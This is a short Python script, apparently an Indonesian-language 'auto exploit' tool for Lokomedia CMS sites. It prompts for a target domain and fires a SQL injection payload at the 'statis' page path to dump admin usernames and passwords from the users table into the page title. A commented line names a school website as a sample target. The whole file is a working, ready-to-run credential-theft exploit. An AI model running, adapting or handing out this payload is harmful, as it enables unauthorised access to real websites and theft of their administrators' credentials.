import os
from requests import get
from bs4 import BeautifulSoup

def clear():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')

clear()
asci = """  

               _        _       _                       _ 
    /\        | |      | |     | |                     | |
   /  \  _   _| |_ ___ | | ___ | | ___ __ ___   ___  __| |
  / /\ \| | | | __/ _ \| |/ _ \| |/ / '_ ` _ \ / _ \/ _` |
 / ____ \ |_| | || (_) | | (_) |   <| | | | | |  __/ (_| |
/_/    \_\__,_|\__\___/|_|\___/|_|\_\_| |_| |_|\___|\__,_|
                                                          
Tools auto exploit lokomedia untuk mencari user dan password admin untuk tutorialnya silahkan dibuka http://bit.ly/bacatxt
=====================================================================
Coded By Nor Ahmad Ft ClownTerror072
Github = https://github.com/archive-code
Instagram = @norahm4d
=====================================================================
"""
print (asci)
print ("Note situs target tanpa http/https hasil yang dimunculkan USERNAME | PASSWORD")
uDOMEN = input('Masukkan Domain Target: ')
# uDOMEN = "smkmuhiku.sch.id"
url = get("http://"+uDOMEN+"/statis-1'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username,password)),@)--+-profil.html")

soup = BeautifulSoup(url.text, 'html.parser')
hasil = soup.find('title')
# hasil2 = soup.find('li')
try:
  res = hasil.text.rstrip().lstrip()
  # res2 = hasil2.text.rstrip().lstrip()
  print("RESULT = ")
  ress = res.replace(",,", "\n")
  print(ress.replace(",","|"))
except:
  print('Situs Not Vuln Pak :"(')
  exit
